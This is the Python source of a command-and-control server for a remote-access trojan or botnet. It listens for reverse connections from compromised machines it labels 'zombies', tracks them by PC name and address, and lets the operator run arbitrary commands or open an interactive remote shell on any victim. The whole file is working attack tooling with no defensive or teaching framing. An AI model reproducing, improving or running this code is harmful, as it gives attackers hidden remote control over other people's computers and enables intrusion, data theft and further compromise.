import sys
import datetime
import socket
from threading import Thread
from multiprocessing import Process

_remote_greet = "[~{}~] $>> "
_local_greet = ">> "
_remote_shell_greet = "[Zombie-Shell] $>> "


class ReverseServer:

    def __init__(self, host, port=20401, buffer=4096, listen=1000, timeout=300):
        self.__scan_proc = None
        self._codec = 'cp866'
        self._buffer_size = buffer
        self._timeout = timeout
        self._listen = listen
        self._zombies = {}
        self.host = host
        self.port = port

    def start(self):
        adding_zombies = Thread(target=self.scan_input_connections, args=(self.host, self.port))
        adding_zombies.start()
        self.__scan_proc = adding_zombies
        while True:
            local_cmd = input(_local_greet)
            self.local_command_handler(local_cmd)

    def scan_input_connections(self, lh, lp):
        reverse_server = socket.socket()
        self.reverse_server = reverse_server
        reverse_server.bind((lh, lp))
        reverse_server.listen(self._listen)
        while True:
            try:
                conn, addr = reverse_server.accept()
                pc_name = conn.recv(self._buffer_size)
                conn.settimeout(self._timeout)
            except ConnectionError:
                continue
            except socket.timeout:
                continue
            self.add_zombie(pc_name, addr, conn)

    def add_zombie(self, pc_name, addr, conn):
        if isinstance(pc_name, bytes):
            pc_name = pc_name.decode()
        for zombie_num in self._zombies:
            zombie = self._zombies.get(zombie_num)
            address = zombie[1]
            if addr[0] == address[0]:
                self._zombies.update({zombie_num: (pc_name, addr, conn)})
                return
        info = (pc_name.strip('\n'), addr, conn)
        self._zombies.update({len(self._zombies) + 1: info})
        sys.stdout.write('\n{}| [NEW ZOMBIE] {} - {}\n>> '
                         .format(datetime.datetime.today().isoformat().split('T')[1], pc_name, addr))
        sys.stdout.flush()

    def local_command_handler(self, command_row):
        if command_row == '':
            return

        row = command_row.split()
        local_command = row[0]
        if local_command == "cn" and len(row) > 1:
            self.connect_to(row[1])

        if local_command == 'ls':
            self.print_connected_zombies()

    def print_connected_zombies(self, sep_len=60):
        for i in self._zombies:
            zombie = self._zombies.get(i)
            print("{}) {} - {}".format(i, zombie[0], zombie[1][0]))
        if self._zombies:
            print('=' * sep_len)

    def connect_to(self, number):
        try:
            number = int(number)
        except ValueError:
            print('[-] Invalid id')
            return

        if number in self._zombies.keys():
            zombie = self._zombies.get(number)
            connect = zombie[2]
            name = zombie[0]
        else:
            print('[-] Connection does not exist')
            return

        while True:
            try:
                cmd = input(_remote_greet.format(name))
                if cmd in ['exit', 'logout', 'exs']:
                    break
                if cmd == 'cnclose':
                    self.shutdown_connection(connect, number, name)
                    break
                if cmd == 'shell':
                    connect.send(cmd.encode())
                    # welcome = connect.recv(self._buffer_size).decode()
                    # print(welcome)
                    while True:
                        shell_cmd = input(_remote_shell_greet)
                        if shell_cmd == 'exit':
                            connect.send(b'exit')
                            print('Shell closed.')
                            break
                        connect.send(shell_cmd.encode())
                        shell_result = connect.recv(self._buffer_size)
                        print(shell_result.decode(self._codec))
                    continue
                else:
                    connect.send(cmd.encode())
                    result = connect.recv(self._buffer_size)
                    print(result.decode(self._codec))

            except ConnectionError as err:
                self.shutdown_connection(connect, number, name, err=str(err))
                break
            except socket.timeout as err:
                self.shutdown_connection(connect, number, name, err=str(err))
                break
            except EOFError:
                print('Received EOF-Signal. Exiting...')
                break

    def shutdown_connection(self, connection, user_number, user_name, err=''):
        connection.shutdown(socket.SHUT_RDWR)
        self._zombies.pop(user_number)
        print('[X] Connection with {} closed ... | {}'.format(user_name, err))

    def __del__(self):
        self.reverse_server.close()

if __name__ == '__main__':
    server = ReverseServer('0.0.0.0')
    server.start()
